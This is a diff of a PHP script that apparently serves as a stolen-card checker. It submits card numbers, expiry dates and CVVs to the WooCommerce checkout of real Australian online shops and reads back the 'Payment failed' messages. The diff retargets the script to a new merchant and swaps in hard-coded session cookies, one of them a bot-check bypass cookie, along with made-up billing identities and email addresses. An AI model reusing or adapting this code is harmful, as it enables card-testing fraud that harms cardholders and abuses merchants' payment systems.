@@ -138,55 +138,55 @@ $auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12))
 
 
 #req1==============================================================================
-function updatecart(){
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/online-shop/test-2/');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
-'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
-'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2F; psn_atf=1; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2F; soundestID=20200605030326-WwmAJQN65GxQ6WcWK06UGlh7gbJ4Q8bw8wUHWsFscOG9LD8B0; omnisendAnonymousID=ICTwJJ3E5Jc1DG-20200605030326; tk_ai=woo%3AOKpJ%2BkfjVqAD9gwdRz527Bb3; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=94ecc6e78c59725a1f42e754c62e73c6%7C%7C1591499073%7C%7C1591495473%7C%7Cf64db11e102bd77c91b41ea9198bb484; omnisendSessionID=TNf8YazO3LSBuh-20200605171554; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2F; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2Fui.js; soundest-views=36',
-'Host: www.artofhearing.com.au',
-'Origin: https://www.artofhearing.com.au',
-'Referer: https://www.artofhearing.com.au/online-shop/test-2/',
-'user-agent: '.$browser.''
-));
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary1PrEDSO8bvXH5drn
-Content-Disposition: form-data; name="quantity"
-
-1
-------WebKitFormBoundary1PrEDSO8bvXH5drn
-Content-Disposition: form-data; name="add-to-cart"
-
-8265
-------WebKitFormBoundary1PrEDSO8bvXH5drn--');
-
-
-$b_pago = curl_exec($ch);
-}
+// function updatecart(){
+//
+//
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/online-shop/test-2/');
+// curl_setopt($ch, CURLOPT_HEADER, 0);
+// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+//    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+//    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+// 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+// 'Accept-Encoding: gzip, deflate, br',
+// 'Accept-Language: en-US,en;q=0.9',
+// 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
+// 'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2F; psn_atf=1; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2F; soundestID=20200605030326-WwmAJQN65GxQ6WcWK06UGlh7gbJ4Q8bw8wUHWsFscOG9LD8B0; omnisendAnonymousID=ICTwJJ3E5Jc1DG-20200605030326; tk_ai=woo%3AOKpJ%2BkfjVqAD9gwdRz527Bb3; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=94ecc6e78c59725a1f42e754c62e73c6%7C%7C1591499073%7C%7C1591495473%7C%7Cf64db11e102bd77c91b41ea9198bb484; omnisendSessionID=TNf8YazO3LSBuh-20200605171554; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2F; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2Fui.js; soundest-views=36',
+// 'Host: www.artofhearing.com.au',
+// 'Origin: https://www.artofhearing.com.au',
+// 'Referer: https://www.artofhearing.com.au/online-shop/test-2/',
+// 'user-agent: '.$browser.''
+// ));
+//
+// curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary1PrEDSO8bvXH5drn
+// Content-Disposition: form-data; name="quantity"
+//
+// 1
+// ------WebKitFormBoundary1PrEDSO8bvXH5drn
+// Content-Disposition: form-data; name="add-to-cart"
+//
+// 8265
+// ------WebKitFormBoundary1PrEDSO8bvXH5drn--');
+//
+//
+// $b_pago = curl_exec($ch);
+// }
 // #==========================================================================================================
 
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://retail.sujikim.com/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
@@ -205,14 +205,13 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2F; psn_atf=1; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2F; soundestID=20200605030326-WwmAJQN65GxQ6WcWK06UGlh7gbJ4Q8bw8wUHWsFscOG9LD8B0; omnisendAnonymousID=ICTwJJ3E5Jc1DG-20200605030326; tk_ai=woo%3AOKpJ%2BkfjVqAD9gwdRz527Bb3; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=94ecc6e78c59725a1f42e754c62e73c6%7C%7C1591499073%7C%7C1591495473%7C%7Cf64db11e102bd77c91b41ea9198bb484; omnisendSessionID=Na5lleIxX7kpLh-20200606020056; woocommerce_items_in_cart=1; woocommerce_cart_hash=0945495a71038112d87c33579ffd3487; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fcheckout%2F; soundest-views=42; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Dwphpc_action%26uid%3D1591408977.1973%26eid%3D2.6940221786499%26url%3Dwww.artofhearing.com.au%252Fcheckout%252F%26lastid%3D775312%26hash%3D0289bc53%26wphpc_browserTime%3D3436%26_%3D1591408980127',
-'Host: www.artofhearing.com.au',
-'Origin: https://www.artofhearing.com.au',
-'Referer: https://www.artofhearing.com.au/checkout/',
+'cookie: PHPSESSID=d1219aa134ffece5f667bbe011b42aae; woocommerce_items_in_cart=1; wp_woocommerce_session_b643725812b33c264fd0a55c474b059e=0fc2fc26d547cbc5195e89e136ca2cf4%7C%7C1591557563%7C%7C1591553963%7C%7Ccd86bdbe08dee9dd331f45e2a5ad436f; woocommerce_cart_hash=669638fbe5eb1d0760129ac2be47ada8; wfvt_2356798933=5edb596cc70c2; wordfence_verifiedHuman=c885d58562c4830247ea736129a75da5',
+'origin: https://retail.sujikim.com',
+'referer: https://retail.sujikim.com/checkout/',
 'user-agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wc_pickup_store&shipping_pickup_stores=Armadale&shipping_by_store=&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=36b939fe66&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=&billing_city=Harris+Park&billing_state=NSW&billing_postcode=2150&billing_phone=5182641524&billing_email=vvarner3%40gmail.com&store_pickup=option_3&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=24+moo+4+tambol+Pluakdaeng&shipping_address_2=&shipping_city=Harris+Park&shipping_state=&shipping_postcode=2150&order_comments=&shipping_method%5B0%5D=flat_rate%3A3&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&_wpnonce=e4ff7a814e&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 
 
@@ -220,7 +219,7 @@ $result = curl_exec($ch);
 
 
 
- $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
+ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>Payment failed: ','<\/li>\n\t<\/ul>\n"')));
 // // // // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));
 
 // // // // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));
